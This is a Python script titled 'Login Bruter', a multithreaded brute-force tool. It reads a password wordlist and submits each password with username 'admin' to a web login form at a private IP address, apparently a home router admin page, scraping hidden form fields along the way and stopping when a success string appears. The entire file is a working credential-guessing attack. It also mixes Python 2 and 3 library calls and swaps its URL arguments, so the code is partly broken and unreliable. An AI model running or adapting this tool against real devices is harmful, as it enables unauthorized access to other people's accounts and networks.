#!/usr/bin/env python
"""Login Bruter."""
import threading
import urllib
import urllib.request
import urllib.error
import urllib.parse
import cookielib
import queue

# import sys
import html.parser


class BruteParser(html.parser.HTMLParser):
    def __init__(self):
        super().__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "id":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value


class Bruter:
    def __init__(
        self,
        username: str,
        words: queue.Queue,
        target_get_form_url,
        target_post_form_url,
        username_field,
        password_field,
        success_checker,
        parser_class: type,
    ):
        self.username = username
        self.password_q = words
        self.found = False
        self.target_get_form_url = target_get_form_url
        self.target_post_form_url = target_post_form_url
        self.username_field = username_field
        self.password_field = password_field
        self.success_checker = success_checker
        self.parser_class = parser_class
        print(f"[*] Done setting up for {username}")

    def run_bruteforce(self, user_threads):
        for i in range(user_threads):
            t = threading.Thread(target=self.web_bruter)
            t.start()
        return

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib.request.build_opener(
                urllib.HTTPCookieProcessor(jar))
            response = opener.open(self.target_get_form_url)
            page = response.read()
            print(
                f"[*] Trying {self.username} : {brute} ({self.password_q.qsize()} Left)"
            )
            # parse out the hidden fields
            parser = self.parser_class()
            parser.feed(page)
            post_tags = parser.tag_results
            # add our username and password fields
            post_tags[self.username_field] = self.username
            post_tags[self.password_field] = brute
            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(self.target_post_form_url, login_data)
            login_result = login_response.read()
            if self.success_checker(login_result):
                self.found = True
                print("[*] Bruteforce Successful!")
                print(f"[*] Username : {self.username}")
                print(f"[*] Password : {brute}")
                print("[*] Waiting for other threads to exit!")


def build_wordlist(wordlist_file, resume=None):
    # read i the wordlist
    with open(wordlist_file, "r") as fd:
        raw_words = fd.readlines()
    found_resume = False
    words = queue.Queue()
    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print(f"[*] Resuming wordlist from : {resume}")
        else:
            words.put(word)
    return words


def example_success_checker(login_result):
    return True if "Status Help" in login_result else False


def main():
    username_field, password_field = "userName", "pcPassword"
    target_post_form_url = "http://192.168.2.1/"
    target_get_form_url = "http://192.168.2.1/"
    br = Bruter(
        "admin",
        words=build_wordlist("all.txt"),
        target_get_form_url=target_post_form_url,
        target_post_form_url=target_get_form_url,
        username_field=username_field,
        password_field=password_field,
        success_checker=example_success_checker,
        parser_class=BruteParser,
    )
    br.run_bruteforce(20)


if __name__ == "__main__":
    main()
